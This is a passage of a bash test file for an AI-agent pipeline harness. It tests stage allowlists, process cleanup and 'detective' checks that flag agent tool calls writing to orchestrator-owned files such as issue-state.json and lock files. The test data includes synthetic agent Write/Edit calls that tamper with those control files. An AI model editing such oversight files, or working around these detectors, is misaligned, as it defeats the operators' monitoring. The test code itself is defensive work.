  _saved_dispatch_id="${PIPELINE_DISPATCH_ID-__unset__}"
  unset PIPELINE_DISPATCH_ID
  export PIPELINE_ISSUE_ID="ENG-T-QA-D"
  printf '## ENG-T-QA-D-d0001 - planning - 2026-05-16T12:00:00Z\n\n- real entry (should not match empty dispatch_id)\n' \
    > "$QA_D_DIR/progress.md"
  rm -f "$QA_D_DIR/.transcript-violation-planning"
  _assert_progress_md_entry "$QA_D_DIR" "$QA_D_DIR/.transcript-violation-planning" "planning" \
    && rc_qa_d=0 || rc_qa_d=$?
  if [[ "$rc_qa_d" == "31" ]]; then
    pass_at "QA-ADV-PGD: unset PIPELINE_DISPATCH_ID → rc=31 (empty grep pattern, no match)"
  else
    fail_at "QA-ADV-PGD" "rc=$rc_qa_d — unset dispatch_id should not match any real H2"
  fi
  # Restore
  if [[ "$_saved_dispatch_id" != "__unset__" ]]; then
    export PIPELINE_DISPATCH_ID="$_saved_dispatch_id"
  else
    unset PIPELINE_DISPATCH_ID
  fi

  # QA-ADV-PG-E: em-dash separator instead of ASCII hyphen (brainstorm §6 edge case)
  # Agent uses '—' (U+2014 em-dash) instead of ' - ' (space-hyphen-space).
  # The detective regex '^## ENG-T-QA-E-d0001 - ' requires ASCII hyphen.
  # Em-dash entry must NOT match → rc=31.
  QA_E_DIR="$_TEST_STUB_DIR/QA-E"; mkdir -p "$QA_E_DIR"
  export PIPELINE_DISPATCH_ID="ENG-T-QA-E-d0001"
  export PIPELINE_ISSUE_ID="ENG-T-QA-E"
  # Write with em-dash separator (U+2014)
  printf '## ENG-T-QA-E-d0001 \xe2\x80\x94 planning \xe2\x80\x94 2026-05-16T12:00:00Z\n\n- em-dash (should be rejected)\n' \
    > "$QA_E_DIR/progress.md"
  rm -f "$QA_E_DIR/.transcript-violation-planning"
  _assert_progress_md_entry "$QA_E_DIR" "$QA_E_DIR/.transcript-violation-planning" "planning" \
    && rc_qa_e=0 || rc_qa_e=$?
  if [[ "$rc_qa_e" == "31" ]] && grep -q "found 0" "$QA_E_DIR/.transcript-violation-planning" 2>/dev/null; then
    pass_at "QA-ADV-PGE: em-dash separator → rc=31 + 'found 0' (brainstorm §6 — ASCII-only)"
  else
    fail_at "QA-ADV-PGE" "rc=$rc_qa_e violation=$(cat "$QA_E_DIR/.transcript-violation-planning" 2>/dev/null || echo '<none>')"
  fi

  # QA-ADV-PG-F: entry has correct dispatch_id but a different stage token
  # (e.g. "qa") while the detective runs for "planning". ENG-146 D-003
  # inverts the pre-ENG-146 contract: the detective now scopes the grep
  # by stage, so a cross-stage entry with a colliding dispatch_id no
  # longer satisfies the planning detective. Expected: rc=31 + 'found 0'.
  QA_F_DIR="$_TEST_STUB_DIR/QA-ADV-PGF"; mkdir -p "$QA_F_DIR"
  export PIPELINE_DISPATCH_ID="ENG-T-QA-F-d0001"
  export PIPELINE_ISSUE_ID="ENG-T-QA-F"
  cat > "$QA_F_DIR/progress.md" <<'MD'
## ENG-T-QA-F-d0001 - qa - 2026-05-16T12:00:00Z

- bullet one (wrong stage label, dispatch_id matches but stage doesn't)
MD
  rm -f "$QA_F_DIR/.transcript-violation-planning"
  _assert_progress_md_entry "$QA_F_DIR" "$QA_F_DIR/.transcript-violation-planning" "planning" && rc_qa_f=0 || rc_qa_f=$?
  if [[ "$rc_qa_f" == "31" ]] && grep -q "found 0" "$QA_F_DIR/.transcript-violation-planning" 2>/dev/null; then
    pass_at "QA-ADV-PGF: wrong stage token → rc=31 + 'found 0' (ENG-146 D-003 stage-scoped grep)"
  else
    fail_at "QA-ADV-PGF" "rc=$rc_qa_f — stage-scoped grep should reject cross-stage entry under same id"
  fi

  # QA-ADV-PG-G: progress.md contains only newlines (non-zero size, no H2 headings)
  # → rc=31 via "found 0" path (non-empty file is not automatically valid)
  QA_G_DIR="$_TEST_STUB_DIR/QA-ADV-PGG"; mkdir -p "$QA_G_DIR"
  export PIPELINE_DISPATCH_ID="ENG-T-QA-G-d0001"
  export PIPELINE_ISSUE_ID="ENG-T-QA-G"
  printf '\n\n\n' > "$QA_G_DIR/progress.md"
  rm -f "$QA_G_DIR/.transcript-violation-planning"
  _assert_progress_md_entry "$QA_G_DIR" "$QA_G_DIR/.transcript-violation-planning" "planning" && rc_qa_g=0 || rc_qa_g=$?
  # grep-c exits rc=1 on no-match (D-005 brainstorm notes this), so '|| printf 0' appends
  # a second "0" making entry_count="0\n0". The detective still fires rc=31 correctly.
  # Assert rc=31 + any "found" diagnostic (the exact count string is "0\n0" — cosmetic).
  if [[ "$rc_qa_g" == "31" ]] && grep -q "found" "$QA_G_DIR/.transcript-violation-planning" 2>/dev/null; then
    pass_at "QA-ADV-PGG: newline-only file → rc=31 + 'found' diagnostic (non-empty but no heading)"
  else
    fail_at "QA-ADV-PGG" "rc=$rc_qa_g violation=$(cat "$QA_G_DIR/.transcript-violation-planning" 2>/dev/null || echo '<none>')"
  fi

  # QA-ADV-PG-H: issue_dir does not exist — violation_file parent is also absent.
  # Detective still returns 31 (progress.md doesn't exist → ! -s path fires), but the
  # redirect to violation_file will silently fail. run-stage.sh falls back to
  # '<violation-detail-unavailable>' via `cat 2>/dev/null || printf`. Pins rc=31.
  QA_H_DIR="$_TEST_STUB_DIR/QA-ADV-PGH-nonexistent"  # intentionally NOT created
  export PIPELINE_DISPATCH_ID="ENG-T-QA-H-d0001"
  export PIPELINE_ISSUE_ID="ENG-T-QA-H"
  _assert_progress_md_entry "$QA_H_DIR" "$QA_H_DIR/.transcript-violation-planning" "planning" && rc_qa_h=0 || rc_qa_h=$?
  if [[ "$rc_qa_h" == "31" ]]; then
    pass_at "QA-ADV-PGH: non-existent issue_dir → rc=31 (violation_file may be unwritten; run-stage fallback path)"
  else
    fail_at "QA-ADV-PGH" "rc=$rc_qa_h (expected 31 when issue_dir absent)"
  fi

  # QA-ADV-PG-I: progress.md is non-empty but mode 0000 (unreadable by current process).
  # grep exits rc=2; the `|| printf 0` arm converts to entry_count=0 → "found 0" → rc=31.
  # This pins the grep-error fallback path and verifies -s passes (file has content)
  # but grep still can't read it.
  QA_I_DIR="$_TEST_STUB_DIR/QA-ADV-PGI"; mkdir -p "$QA_I_DIR"
  export PIPELINE_DISPATCH_ID="ENG-T-QA-I-d0001"
  export PIPELINE_ISSUE_ID="ENG-T-QA-I"
  printf '## ENG-T-QA-I-d0001 - planning - 2026-05-16T12:00:00Z\n- bullet\n' \
    > "$QA_I_DIR/progress.md"
  chmod 000 "$QA_I_DIR/progress.md"
  rm -f "$QA_I_DIR/.transcript-violation-planning"
  _assert_progress_md_entry "$QA_I_DIR" "$QA_I_DIR/.transcript-violation-planning" "planning" \
    && rc_qa_i=0 || rc_qa_i=$?
  chmod 644 "$QA_I_DIR/progress.md"  # restore before tmpdir cleanup
  if [[ "$rc_qa_i" == "31" ]]; then
    pass_at "QA-ADV-PGI: unreadable progress.md (mode 0000) → rc=31 via grep-error fallback"
  else
    fail_at "QA-ADV-PGI" "rc=$rc_qa_i (expected 31 when progress.md unreadable)"
  fi

  unset PIPELINE_DISPATCH_ID PIPELINE_ISSUE_ID
fi

# ─── ENG-146 — strip_state_preserve_alloc + stage-scoped detective ────
# Two-fold coverage: (1) the shared helper in common.sh preserves
# {seq, id, stage} on a state file with allocator fields, rm -f's on
# legacy / corrupt / missing; (2) the detective scoped by stage
# returns count=1 when only one stage's entry matches under a
# colliding dispatch_id.
printf '\n--- ENG-146: strip_state_preserve_alloc + stage-scoped detective ---\n'

if ! declare -f strip_state_preserve_alloc >/dev/null 2>&1; then
  fail_at "ENG-146 precondition: strip_state_preserve_alloc defined in common.sh" \
          "function not in scope after sourcing dispatch.sh (common.sh export)"
else
  # AC-STRIP-A — allocator fields present + extra classify-set fields
  # → stripped to exactly {seq, id, stage}; the classify fields are gone.
  AS_A_FILE="$_TEST_STUB_DIR/AC-STRIP-A.json"
  cat > "$AS_A_FILE" <<'JSON'
{"policy":"skip-until-human-acts","reason":"test","retry_count":2,"current_dispatch_seq":5,"current_dispatch_id":"ENG-T-d0005","current_stage":"planning","evidence":{"branch_head_sha":"abc"}}
JSON
  strip_state_preserve_alloc "$AS_A_FILE"
  as_a_seq="$(jq -r '.current_dispatch_seq // ""'  "$AS_A_FILE" 2>/dev/null)"
  as_a_id="$(jq -r '.current_dispatch_id // ""' "$AS_A_FILE" 2>/dev/null)"
  as_a_stage="$(jq -r '.current_stage // ""' "$AS_A_FILE" 2>/dev/null)"
  as_a_policy="$(jq -r '.policy // ""' "$AS_A_FILE" 2>/dev/null)"
  as_a_keys="$(jq -r 'keys | join(",")' "$AS_A_FILE" 2>/dev/null)"
  if [[ "$as_a_seq" == "5" && "$as_a_id" == "ENG-T-d0005" && "$as_a_stage" == "planning" \
        && "$as_a_policy" == "" && "$as_a_keys" == "current_dispatch_id,current_dispatch_seq,current_stage" ]]; then
    pass_at "AC-STRIP-A: allocator fields preserved, classify fields dropped (keys=$as_a_keys)"
  else
    fail_at "AC-STRIP-A" "seq=$as_a_seq id=$as_a_id stage=$as_a_stage policy=$as_a_policy keys=$as_a_keys"
  fi

  # AC-STRIP-B — legacy: no allocator fields → rm -f (file gone)
  AS_B_FILE="$_TEST_STUB_DIR/AC-STRIP-B.json"
  cat > "$AS_B_FILE" <<'JSON'
{"policy":"skip-until-human-acts","reason":"test","retry_count":2}
JSON
  strip_state_preserve_alloc "$AS_B_FILE"
  if [[ ! -e "$AS_B_FILE" ]]; then
    pass_at "AC-STRIP-B: legacy file (no allocator fields) → rm -f"
  else
    fail_at "AC-STRIP-B" "file still present after strip on legacy state"
  fi

  # AC-STRIP-C — corrupt JSON → rm -f (file gone)
  AS_C_FILE="$_TEST_STUB_DIR/AC-STRIP-C.json"
  printf 'not-json-content\n' > "$AS_C_FILE"
  strip_state_preserve_alloc "$AS_C_FILE"
  if [[ ! -e "$AS_C_FILE" ]]; then
    pass_at "AC-STRIP-C: corrupt JSON → rm -f"
  else
    fail_at "AC-STRIP-C" "corrupt file still present after strip"
  fi

  # AC-STRIP-D — missing file → no-op (return 0)
  AS_D_FILE="$_TEST_STUB_DIR/AC-STRIP-D-nonexistent.json"
  rm -f "$AS_D_FILE"
  if strip_state_preserve_alloc "$AS_D_FILE"; then
    pass_at "AC-STRIP-D: missing file → no-op success"
  else
    fail_at "AC-STRIP-D" "non-zero rc on missing-file strip (idempotency violation)"
  fi
fi

if declare -f _assert_progress_md_entry >/dev/null 2>&1; then
  # AC-DETECTIVE-STAGE-SCOPED — progress.md with two H2 entries under
  # the SAME dispatch_id but different stages (brainstorming + planning).
  # Pre-ENG-146 grep would count both → rc=31 (false positive).
  # Post-ENG-146 grep scopes by stage → count=1 for each call.
  DSS_DIR="$_TEST_STUB_DIR/AC-DETECTIVE-STAGE-SCOPED"; mkdir -p "$DSS_DIR"
  export PIPELINE_DISPATCH_ID="ENG-T-DSS-d0007"
  export PIPELINE_ISSUE_ID="ENG-T-DSS"
  cat > "$DSS_DIR/progress.md" <<'MD'
## ENG-T-DSS-d0007 - brainstorming - 2026-05-18T01:00:00Z

- brainstorming bullet

## ENG-T-DSS-d0007 - planning - 2026-05-18T01:05:00Z

- planning bullet
MD
  rm -f "$DSS_DIR/.transcript-violation-planning"
  _assert_progress_md_entry "$DSS_DIR" "$DSS_DIR/.transcript-violation-planning" "planning" \
    && rc_dss_p=0 || rc_dss_p=$?
  rm -f "$DSS_DIR/.transcript-violation-planning"
  _assert_progress_md_entry "$DSS_DIR" "$DSS_DIR/.transcript-violation-planning" "brainstorming" \
    && rc_dss_b=0 || rc_dss_b=$?
  if [[ "$rc_dss_p" == "0" && "$rc_dss_b" == "0" ]]; then
    pass_at "AC-DETECTIVE-STAGE-SCOPED: cross-stage entries under same dispatch_id → each stage's detective passes (planning=$rc_dss_p brainstorming=$rc_dss_b)"
  else
    fail_at "AC-DETECTIVE-STAGE-SCOPED" "planning=$rc_dss_p brainstorming=$rc_dss_b — both should be 0"
  fi
  unset PIPELINE_DISPATCH_ID PIPELINE_ISSUE_ID
fi

# ─── T-A — ENG-131 no-hang (orphan-writer scenario; D-001 file-decoupling) ─
# The bug class: a `cmd | reader` pipe blocks the reader while orphans of
# cmd hold the inherited fd1 (the pipe's write end). The fix (D-001) replaces
# the pipe with `cmd > capture-file; reader < capture-file`, decoupling fd1
# from the reader's blocking semantics. Test the file-decoupling property
# directly: spawn a perl-setsid wrapped subshell that exits cleanly while
# leaving a background writer holding inherited fd1. The parent `wait`
# returns promptly (well under 5s) because fd1 is now a regular file —
# orphan writers can keep writing but nothing else is blocked.
printf '\n--- T-A: ENG-131 no-hang (orphan-writer scenario; D-001 file-decoupling) ---\n'
TA_CAPTURE="$_TEST_STUB_DIR/ta-cmd-capture.tmp"
rm -f "$TA_CAPTURE"
TA_START_SEC=$(date +%s)
# Wrap under perl-setsid so we can kill the whole tree at test cleanup.
( exec /usr/bin/perl -e 'use POSIX qw(setsid); setsid; exec @ARGV' \
    bash -c '
      printf "{\"type\":\"system\",\"subtype\":\"init\",\"session_id\":\"taXXXXXX\",\"model\":\"test\"}\n"
      # Background writer holds the inherited fd1 after we exit.
      ( sleep 30 1>&1 ) &
      disown 2>/dev/null || true
      exit 0
    ' > "$TA_CAPTURE" 2>/dev/null ) &
TA_PID=$!
# Parent `wait` MUST return promptly once the perl-setsid leader exits, even
# though the orphan writer's fd1 is still open — because fd1 is a regular
# file, not a pipe.
wait "$TA_PID" 2>/dev/null || true
TA_ELAPSED=$(( $(date +%s) - TA_START_SEC ))
# Reap the lingering orphan writer so it doesn't run for 30s in the gate.
kill -TERM -- "-$TA_PID" 2>/dev/null || true
sleep 1
kill -KILL -- "-$TA_PID" 2>/dev/null || true
if (( TA_ELAPSED <= 5 )) && [[ -s "$TA_CAPTURE" ]] && grep -q '"type":"system"' "$TA_CAPTURE"; then
  pass_at "T-A: ENG-131 no-hang — sequential capture-file (cmd > file; reader < file) decouples parent wait from orphan fd1 holders (elapsed=${TA_ELAPSED}s, capture-size=$(wc -c < "$TA_CAPTURE" | tr -d ' ') bytes)"
else
  fail_at "T-A: ENG-131 no-hang" "elapsed=${TA_ELAPSED}s (expected ≤5s) capture-bytes=$(wc -c < "$TA_CAPTURE" 2>/dev/null | tr -d ' ' || echo 0) — pre-ENG-131 cmd|reader pipe shape regression"
fi
rm -f "$TA_CAPTURE"

# ─── T-B — ENG-131 no-orphan (descendant-tree reap; D-002 pgrp cleanup) ───
# The resource-leak class: when gtimeout SIGKILLs claude, MCP-server
# descendants get reparented to launchd and accumulate as zombie/runaway
# processes. The fix (D-002) wraps cmd under perl POSIX::setsid so the
# descendants share a single pgrp; _dispatch_cleanup's EXIT trap signals
# -TERM/-KILL on the pgrp to reap them. Test the pgrp-reap semantics
# directly: spawn a 3-level descendant tree under perl-setsid, capture the
# pgrp leader's pid, signal -TERM/-KILL, assert no descendant survives.
printf '\n--- T-B: ENG-131 no-orphan (descendant-tree reap; D-002 pgrp cleanup) ---\n'
TB_PGID_FILE="$_TEST_STUB_DIR/tb-pgid"
TB_CAPTURE="$_TEST_STUB_DIR/tb-capture.tmp"
rm -f "$TB_PGID_FILE" "$TB_CAPTURE"
( exec /usr/bin/perl -e 'use POSIX qw(setsid); setsid; exec @ARGV' \
    bash -c "
      # After setsid, our pid IS our pgrp id; record it for the assertion.
      printf '%s\n' \"\$\$\" > '$TB_PGID_FILE'
      # Spawn a 3-level descendant tree of long-sleepers.
      ( ( sleep 60 ) & ) &
      ( sleep 60 ) &
      sleep 60 &
      disown -a 2>/dev/null || true
      exit 0
    " > "$TB_CAPTURE" 2>/dev/null ) &
TB_PID=$!
wait "$TB_PID" 2>/dev/null || true
TB_PGID="$(cat "$TB_PGID_FILE" 2>/dev/null || true)"
if [[ -z "$TB_PGID" || ! "$TB_PGID" =~ ^[0-9]+$ ]]; then
  fail_at "T-B: ENG-131 no-orphan" "could not capture pgid (TB_PGID='$TB_PGID')"
else
  # Simulate _dispatch_cleanup's pgrp reap.
  kill -TERM -- "-$TB_PGID" 2>/dev/null || true
  sleep 1
  kill -KILL -- "-$TB_PGID" 2>/dev/null || true
  # Brief grace for the kernel to reap.
  sleep 1
  TB_ORPHANS="$(pgrep -g "$TB_PGID" 2>/dev/null || true)"
  if [[ -z "$TB_ORPHANS" ]]; then
    pass_at "T-B: ENG-131 no-orphan — pgrp signal reaped all descendants (pgid=$TB_PGID, orphan-count=0)"
  else
    fail_at "T-B: ENG-131 no-orphan" "descendants alive after TERM/KILL of pgid $TB_PGID: $TB_ORPHANS"
  fi
fi
rm -f "$TB_CAPTURE" "$TB_PGID_FILE"

# ─── ENG-155 AC-GIT-ADD-AUDIT: per-stage git add allowlist audit ─────────
# Pins the deliberate OQ-2 decision: planning stage intentionally omits
# git add/commit from its allowlist; implementing/ui contain the literal
# Bash(git add:*); qa uses the wider Bash(git:*) wildcard.
# When OQ-2's follow-up ticket adds git add to planning, invert the last assertion.
printf '\n--- ENG-155 AC-GIT-ADD-AUDIT: per-stage git-add allowlist audit ---\n'

for _git_stage in implementing ui; do
  _git_tools="$(allowed_tools_for "$_git_stage" 2>/dev/null)"
  if printf '%s' "$_git_tools" | grep -qF 'Bash(git add:*)'; then
    pass_at "AC-GIT-ADD-AUDIT: stage=$_git_stage contains literal Bash(git add:*)"
  else
    fail_at "AC-GIT-ADD-AUDIT: stage=$_git_stage must contain Bash(git add:*)" \
      "tools=$_git_tools"
  fi
done

# qa uses Bash(git:*) wildcard which covers git add
_qa_tools="$(allowed_tools_for "qa" 2>/dev/null)"
if printf '%s' "$_qa_tools" | grep -qF 'Bash(git:*)'; then
  pass_at "AC-GIT-ADD-AUDIT: stage=qa contains Bash(git:*) wildcard (covers git add)"
else
  fail_at "AC-GIT-ADD-AUDIT: stage=qa must contain Bash(git:*) wildcard" \
    "tools=$_qa_tools"
fi

# planning intentionally omits git add — pinning D-005's deliberate omission
_planning_tools="$(allowed_tools_for "planning" 2>/dev/null)"
if ! printf '%s' "$_planning_tools" | grep -qF 'Bash(git add:*)' \
   && ! printf '%s' "$_planning_tools" | grep -qF 'Bash(git:*)'; then
  pass_at "AC-GIT-ADD-AUDIT: stage=planning correctly omits Bash(git add:*) and Bash(git:*) (D-005/OQ-2)"
else
  fail_at "AC-GIT-ADD-AUDIT: stage=planning must NOT contain Bash(git add:*) or Bash(git:*)" \
    "tools=$_planning_tools"
fi

# ─── ENG-155 AC-D003: D-003 orchestrator-owned-file detective fixtures ───
# Direct-helper-invocation fixtures mirroring the EW1/EW2 (ENG-109) shape.
# All D-003 calls use mode="contains" (5-arg form) to match the dispatch.sh loop.
printf '\n--- ENG-155 AC-D003: orchestrator-owned-file detective fixtures ---\n'

if ! declare -f assert_no_tool_with_input_path >/dev/null 2>&1; then
  fail_at "AC-D003-precondition: assert_no_tool_with_input_path defined" \
          "function not found — Task 1 implementation missing"
  printf '\nRESULTS: %d passed, %d failed\n' "$PASS" "$FAIL"
  exit 1
fi

# AC-D003-A: Write against /issue-state.json → rc=1 + matched path
TX_D003A="$_TEST_STUB_DIR/tx-d003a.ndjson"
cat > "$TX_D003A" <<'NDJSON'
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Write","input":{"file_path":"/Users/x/.local/state/twinning-harness/harness/foo/ENG-1/issue-state.json"}}]}}
NDJSON
out_d003a="$(assert_no_tool_with_input_path "$TX_D003A" "Write,Edit" "file_path" "/issue-state.json" "contains")" && rc_d003a=0 || rc_d003a=$?
if [[ "$rc_d003a" == "1" && "$out_d003a" == *"/issue-state.json" ]]; then
  pass_at "AC-D003-A: Write on /issue-state.json → rc=1 + matched path"
else
  fail_at "AC-D003-A" "rc=$rc_d003a out=$out_d003a"
fi

# AC-D003-B: Edit against /wait-planning.json via "/wait-" contains → rc=1
TX_D003B="$_TEST_STUB_DIR/tx-d003b.ndjson"
cat > "$TX_D003B" <<'NDJSON'
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Edit","input":{"file_path":"/Users/x/.local/state/twinning-harness/harness/foo/ENG-1/wait-planning.json"}}]}}
NDJSON
out_d003b="$(assert_no_tool_with_input_path "$TX_D003B" "Write,Edit" "file_path" "/wait-" "contains")" && rc_d003b=0 || rc_d003b=$?
if [[ "$rc_d003b" == "1" && "$out_d003b" == *"wait-planning"* ]]; then
  pass_at "AC-D003-B: Edit on /wait-planning.json via '/wait-' contains → rc=1"
else
  fail_at "AC-D003-B" "rc=$rc_d003b out=$out_d003b"
fi

# AC-D003-C: Write against /dispatch_history.jsonl → rc=1
TX_D003C="$_TEST_STUB_DIR/tx-d003c.ndjson"
cat > "$TX_D003C" <<'NDJSON'
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Write","input":{"file_path":"/Users/x/.local/state/twinning-harness/harness/foo/ENG-1/dispatch_history.jsonl"}}]}}
NDJSON
out_d003c="$(assert_no_tool_with_input_path "$TX_D003C" "Write,Edit" "file_path" "/dispatch_history.jsonl" "contains")" && rc_d003c=0 || rc_d003c=$?
if [[ "$rc_d003c" == "1" && "$out_d003c" == *"dispatch_history.jsonl" ]]; then
  pass_at "AC-D003-C: Write on /dispatch_history.jsonl → rc=1"
else
  fail_at "AC-D003-C" "rc=$rc_d003c out=$out_d003c"
fi

# AC-D003-D: Edit against /usage-planning.json via "/usage-" contains → rc=1
TX_D003D="$_TEST_STUB_DIR/tx-d003d.ndjson"
cat > "$TX_D003D" <<'NDJSON'
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Edit","input":{"file_path":"/Users/x/.local/state/twinning-harness/harness/foo/ENG-1/usage-planning.json"}}]}}
NDJSON
out_d003d="$(assert_no_tool_with_input_path "$TX_D003D" "Write,Edit" "file_path" "/usage-" "contains")" && rc_d003d=0 || rc_d003d=$?
if [[ "$rc_d003d" == "1" && "$out_d003d" == *"usage-planning"* ]]; then
  pass_at "AC-D003-D: Edit on /usage-planning.json via '/usage-' contains → rc=1"
else
  fail_at "AC-D003-D" "rc=$rc_d003d out=$out_d003d"
fi

# AC-D003-E: Write against /progress.md (benign for D-003) — must NOT trip
TX_D003E="$_TEST_STUB_DIR/tx-d003e.ndjson"
cat > "$TX_D003E" <<'NDJSON'
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Write","input":{"file_path":"/Users/x/.local/state/twinning-harness/harness/foo/ENG-1/progress.md"}}]}}
NDJSON
out_d003e="$(assert_no_tool_with_input_path "$TX_D003E" "Write,Edit" "file_path" "/issue-state.json" "contains")" && rc_d003e=0 || rc_d003e=$?
if [[ "$rc_d003e" == "0" && -z "$out_d003e" ]]; then
  pass_at "AC-D003-E: Write on /progress.md (benign) with '/issue-state.json' check → rc=0 (D-003 does not cover progress.md)"
else
  fail_at "AC-D003-E" "rc=$rc_d003e out=$out_d003e"
fi

# AC-D003-F: Write against /stage-summary-planning.md (agent contract) — must NOT trip any D-003 suffix
TX_D003F="$_TEST_STUB_DIR/tx-d003f.ndjson"
cat > "$TX_D003F" <<'NDJSON'
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Write","input":{"file_path":"/Users/x/.local/state/twinning-harness/harness/foo/ENG-1/stage-summary-planning.md"}}]}}
NDJSON
_d003f_all_pass=1
for _d003f_pat in "/issue-state.json" "/dispatch_history.jsonl" "/wait-" "/usage-" "/.raw-stream.ndjson.tmp" "/.cmd-capture-" "/.envelope-transcript-" "/.transcript-violation-" "/.allocate.lock" "/.consecutive-failures" "/.in-flight.lock" "/scope-approval"; do
  out_d003f="$(assert_no_tool_with_input_path "$TX_D003F" "Write,Edit" "file_path" "$_d003f_pat" "contains")" && rc_d003f=0 || rc_d003f=$?
  if [[ "$rc_d003f" != "0" || -n "$out_d003f" ]]; then
    fail_at "AC-D003-F: stage-summary-planning.md must NOT trip D-003 pattern '$_d003f_pat'" \
      "rc=$rc_d003f out=$out_d003f"
    _d003f_all_pass=0
  fi
done
if [[ "$_d003f_all_pass" == "1" ]]; then
  pass_at "AC-D003-F: Write on /stage-summary-planning.md returns rc=0 for all 12 D-003 patterns (benign)"
fi

# AC-D003-G: end-to-end via _render_and_capture_stream
# Synth a stream containing Write→/issue-state.json + type:result event;
# assert the renderer returns rc=29 and violation_file names /issue-state.json.
printf '\n--- ENG-155 AC-D003-G: end-to-end _render_and_capture_stream D-003 trip ---\n'
if declare -f _render_and_capture_stream >/dev/null 2>&1; then
  D003G_DIR="$_TEST_STUB_DIR/AC-D003G"; mkdir -p "$D003G_DIR"
  export PIPELINE_DISPATCH_ID="ENG-T-D003G-d0001"
  export PIPELINE_ISSUE_ID="ENG-T-D003G"
  _d003g_usage="$D003G_DIR/usage-planning.json"
  # Synthetic NDJSON: assistant Write on issue-state.json + result event
  rc_d003g=0
  printf '%s\n%s\n' \
    '{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Write","input":{"file_path":"/Users/x/.local/state/twinning-harness/harness/foo/ENG-T-D003G/issue-state.json"}}]}}' \
    '{"type":"result","subtype":"success","is_error":false,"result":"done","total_cost_usd":0.001,"usage":{"input_tokens":100,"output_tokens":50,"cache_creation_input_tokens":0,"cache_read_input_tokens":0}}' \
    | _render_and_capture_stream "$_d003g_usage" "$D003G_DIR" "planning" \
    >/dev/null 2>&1 || rc_d003g=$?
  _d003g_violation="$(cat "$D003G_DIR/.transcript-violation-planning" 2>/dev/null || true)"
  if [[ "$rc_d003g" == "29" && "$_d003g_violation" == *"/issue-state.json" ]]; then
    pass_at "AC-D003-G: _render_and_capture_stream returns rc=29 with violation sidecar naming /issue-state.json"
  else
    fail_at "AC-D003-G" "rc=$rc_d003g violation='$_d003g_violation' (expected rc=29 + path containing /issue-state.json)"
  fi
  unset PIPELINE_DISPATCH_ID PIPELINE_ISSUE_ID
else
  fail_at "AC-D003-G precondition: _render_and_capture_stream defined" \
    "function not found after sourcing dispatch.sh"
fi

# AC-D003-K: Write against /.raw-stream.ndjson.tmp → rc=1 (positive fixture for dispatch sidecar)
TX_D003K="$_TEST_STUB_DIR/tx-d003k.ndjson"
cat > "$TX_D003K" <<'NDJSON'
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Write","input":{"file_path":"/Users/x/.local/state/twinning-harness/harness/foo/ENG-1/.raw-stream.ndjson.tmp"}}]}}
NDJSON
out_d003k="$(assert_no_tool_with_input_path "$TX_D003K" "Write,Edit" "file_path" "/.raw-stream.ndjson.tmp" "contains")" && rc_d003k=0 || rc_d003k=$?
if [[ "$rc_d003k" == "1" && "$out_d003k" == *"/.raw-stream.ndjson.tmp" ]]; then
  pass_at "AC-D003-K: Write on /.raw-stream.ndjson.tmp → rc=1"
else
  fail_at "AC-D003-K" "rc=$rc_d003k out=$out_d003k"
fi

# AC-D003-L: Edit against /.cmd-capture-planning → rc=1
TX_D003L="$_TEST_STUB_DIR/tx-d003l.ndjson"
cat > "$TX_D003L" <<'NDJSON'
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Edit","input":{"file_path":"/Users/x/.local/state/twinning-harness/harness/foo/ENG-1/.cmd-capture-planning"}}]}}
NDJSON
out_d003l="$(assert_no_tool_with_input_path "$TX_D003L" "Write,Edit" "file_path" "/.cmd-capture-" "contains")" && rc_d003l=0 || rc_d003l=$?
if [[ "$rc_d003l" == "1" && "$out_d003l" == *"/.cmd-capture-"* ]]; then
  pass_at "AC-D003-L: Edit on /.cmd-capture-planning via '/.cmd-capture-' contains → rc=1"
else
  fail_at "AC-D003-L" "rc=$rc_d003l out=$out_d003l"
fi

# AC-D003-M: Write against /.envelope-transcript-planning → rc=1
TX_D003M="$_TEST_STUB_DIR/tx-d003m.ndjson"
cat > "$TX_D003M" <<'NDJSON'
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Write","input":{"file_path":"/Users/x/.local/state/twinning-harness/harness/foo/ENG-1/.envelope-transcript-planning"}}]}}
NDJSON
out_d003m="$(assert_no_tool_with_input_path "$TX_D003M" "Write,Edit" "file_path" "/.envelope-transcript-" "contains")" && rc_d003m=0 || rc_d003m=$?
if [[ "$rc_d003m" == "1" && "$out_d003m" == *"/.envelope-transcript-"* ]]; then
  pass_at "AC-D003-M: Write on /.envelope-transcript-planning via '/.envelope-transcript-' contains → rc=1"
else
  fail_at "AC-D003-M" "rc=$rc_d003m out=$out_d003m"
fi

# AC-D003-N: Edit against /.transcript-violation-planning → rc=1
TX_D003N="$_TEST_STUB_DIR/tx-d003n.ndjson"
cat > "$TX_D003N" <<'NDJSON'
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Edit","input":{"file_path":"/Users/x/.local/state/twinning-harness/harness/foo/ENG-1/.transcript-violation-planning"}}]}}
NDJSON
out_d003n="$(assert_no_tool_with_input_path "$TX_D003N" "Write,Edit" "file_path" "/.transcript-violation-" "contains")" && rc_d003n=0 || rc_d003n=$?
if [[ "$rc_d003n" == "1" && "$out_d003n" == *"/.transcript-violation-"* ]]; then
  pass_at "AC-D003-N: Edit on /.transcript-violation-planning via '/.transcript-violation-' contains → rc=1"
else
  fail_at "AC-D003-N" "rc=$rc_d003n out=$out_d003n"
fi

# AC-D003-O: Write against /.allocate.lock → rc=1
TX_D003O="$_TEST_STUB_DIR/tx-d003o.ndjson"
cat > "$TX_D003O" <<'NDJSON'
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Write","input":{"file_path":"/Users/x/.local/state/twinning-harness/harness/foo/ENG-1/.allocate.lock"}}]}}
NDJSON
out_d003o="$(assert_no_tool_with_input_path "$TX_D003O" "Write,Edit" "file_path" "/.allocate.lock" "contains")" && rc_d003o=0 || rc_d003o=$?
if [[ "$rc_d003o" == "1" && "$out_d003o" == *"/.allocate.lock" ]]; then
  pass_at "AC-D003-O: Write on /.allocate.lock → rc=1"
else
  fail_at "AC-D003-O" "rc=$rc_d003o out=$out_d003o"
fi

